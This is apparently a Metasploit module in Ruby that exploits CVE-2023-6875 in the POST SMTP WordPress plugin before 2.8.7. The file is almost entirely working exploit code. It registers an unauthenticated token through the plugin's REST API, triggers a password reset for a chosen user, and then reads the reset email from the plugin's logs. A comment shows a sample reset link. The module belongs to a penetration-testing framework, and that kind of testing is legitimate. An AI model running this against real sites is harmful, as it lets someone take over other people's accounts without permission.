##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Wordpress POST SMTP Account Takeover',
        'Description' => %q{
          POST SMTP LMS, a WordPress plugin,
          prior to 2.8.7 is affected by a privilege escalation where an unauthenticated
          user is able to reset the password of an arbitrary user.
        },
        'Author' => [
          'h00die', # msf module
          'Ulysses Saicha', # Discovery, POC
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2023-6875'],
          ['URL', 'https://github.com/UlyssesSaicha/CVE-2023-6875/tree/main'],
        ],
        'DisclosureDate' => '2024-01-10',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )
    register_options(
      [
        OptString.new('USERNAME', [true, 'Username to password reset', '']),
      ]
    )
  end

  def register_token
    vprint_status('Registering token')
    token = Rex::Text.rand_text_alphanumeric(10..16)
    device = Rex::Text.rand_text_alphanumeric(10..16)
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'wp-json', 'post-smtp', 'v1', 'connect-app'),
      'ctype' => 'application/x-www-form-urlencoded',
      'headers' => { 'fcm-token' => token, 'device' => device }
    )
    fail_with(Failure::Unreachable, 'Connection failed') unless res
    fail_with(Failure::UnexpectedReply, 'Request Failed to return a successful response') unless res.code == 200 # 404 if the URL structure is wonky, 401 not vulnerable
    print_good("Succesfully created token: #{token}")
    return token, device
  end

  def check
    unless wordpress_and_online?
      return Msf::Exploit::CheckCode::Safe('Server not online or not detected as wordpress')
    end

    checkcode = check_plugin_version_from_readme('post-smtp', '2.8.6')
    if checkcode == Msf::Exploit::CheckCode::Safe
      return Msf::Exploit::CheckCode::Safe('POST SMTP version not vulnerable')
    end

    checkcode
  end

  def run
    fail_with(Failure::NotFound, "#{datastore['USERNAME']} not found on this wordpress install") unless wordpress_user_exists? datastore['USERNAME']
    token, device = register_token
    fail_with(Failure::UnexpectedReply, "Password reset for #{datastore['USERNAME']} failed") unless reset_user_password(datastore['USERNAME'])
    print_status('Requesting logs')
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'wp-json', 'post-smtp', 'v1', 'get-logs'),
      'ctype' => 'application/x-www-form-urlencoded',
      'headers' => { 'fcm-token' => token, 'device' => device }
    )
    fail_with(Failure::Unreachable, 'Connection failed') unless res
    fail_with(Failure::UnexpectedReply, 'Request Failed to return a successful response') unless res.code == 200
    json_doc = res.get_json_document
    # we want the latest email as that's the one with the password reset
    doc_id = json_doc['data'][0]['id']
    print_status("Requesting email content from logs for ID #{doc_id}")
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin.php'),
      'ctype' => 'application/x-www-form-urlencoded',
      'headers' => { 'fcm-token' => token, 'device' => device },
      'vars_get' => { 'access_token' => token, 'type' => 'log', 'log_id' => doc_id }
    )
    fail_with(Failure::Unreachable, 'Connection failed') unless res
    fail_with(Failure::UnexpectedReply, 'Request Failed to return a successful response') unless res.code == 200
    # XXX we'll need to process this email and pull out the link, likely a regex. Example from my test: http://1.1.1.1/wp-login.php?action=rp&key=EwDT7OKgZiMPIhinsrhY&login=admin&wp_lang=en_US
    puts res.body
  end
end
